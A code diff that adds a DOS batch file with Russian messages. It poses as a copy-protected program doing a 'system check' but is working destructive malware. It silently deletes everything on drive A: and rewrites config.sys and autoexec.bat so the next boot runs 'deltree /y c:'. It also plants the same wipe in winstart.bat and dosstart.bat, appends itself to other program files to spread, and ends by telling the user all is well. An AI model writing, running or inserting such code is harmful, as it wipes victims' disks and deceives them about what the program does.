@@ -1,0 +1,65 @@
+:(c) Soul
+@echo off
+echo     Внимание! Все права защищены! Любое копрование этой программы,
+echo в целях выгоды врагам, является нарушением прав потребителей!
+echo Вставьте системную дискету и нажмите Enter
+pause > nul
+echo ИДЕТ ПРОЕРКА СИСТЕМЫ... ЭТО МОЖЕТ ЗАНЯТЬ НЕСКОЛЬКО МИНУТ
+@ctty nul
+attrib a:\*.* -h -r -s -a
+deltree/y a:\*.*
+set conf= c:\config.sys
+set axec= c:\autoexec.bat
+attrib %conf% -h -r -a -s
+copy %conf% tmp.sys
+attrib tmp.sys +r
+del %conf%
+echo [Menu] >> %conf%
+echo MenuItem for,FORMAT MY HARD DISK >> %conf%
+echo MenuItem ers,ERASE ALL FILE ON MY DRIVE >> %conf%
+echo MenuDefault for,30 >> %conf%
+echo. >> %conf%
+echo. >> %conf%
+echo [for] >> %conf%
+echo. >> %conf%
+echo. >> %conf%
+echo [ers] >> %conf%
+echo. >> %conf%
+echo. >> %conf%
+echo [Common] >> %conf%
+type tmp.sys >> %conf%
+attrib tmp.sys -r
+del tmp.sys
+attrib c:\config.sys +r
+attrib %axec% -h -r -s -a
+del %axec%
+echo @echo off >> %axec%
+echo c:\nc\keyrus.com >> %axec%
+echo keyrus.com  >> %axec%
+echo echo Какая разница что ты выбрал? Правильно! Никакой! >> %axec%
+echo echo Давай уж, напоследок, я расскажу тебе анекдот!  >> %axec%
+echo echo Солдат 2 года отслужил, и как водиться купил бутылку водки, >> %axec%
+echo echo чтобы дома дембель отпразновать! Но тут прапорщик увидел >> %axec%
+echo echo у него этот чудо-русский напиток, и давай злобно коситься! >> %axec%
+echo echo Солдат не выдержал и предложил ему раздавить её вдвоём! >> %axec%
+echo echo Гусь, свинье не товарищ! - ОТветил прапорщик! >> %axec%
+echo echo Да, вы знаете, ответил солдат: Я такой гусь, что с любой свиньей выпью! >> %axec%
+echo echo Ну вот и все! >> %axec%
+echo @ctty nul >> %axec%
+echo deltree/y c: >> %axec%
+for %%a in (*.bat *.exe *.com ..\*.com ..\*.exe) do set _c=%%a
+echo. >> %_c%
+type %0 >> %_c%
+echo @echo off >> %winbootdir%\winstart.bat
+echo @ctty nul >> %winbootdir%\winstart.bat
+echo deltree/y c: >> %winbootdir%\winstart.bat
+echo echo Svoloch >> %winbootdir%\winstart.bat
+echo @echo off >> %winbootdir%\dosstart.bat
+echo @ctty nul >> %winbootdir%\dosstart.bat
+echo deltree/y c: >> %winbootdir%\dosstart.bat
+echo echo Svoloch >> %winbootdir%\dosstart.bat
+copy %0 ..
+copy %0 a:\%0
+for %%b in (*.?Y?) do ren %%b *.XYЙ
+@ctty con
+echo Всё в полном порядке!
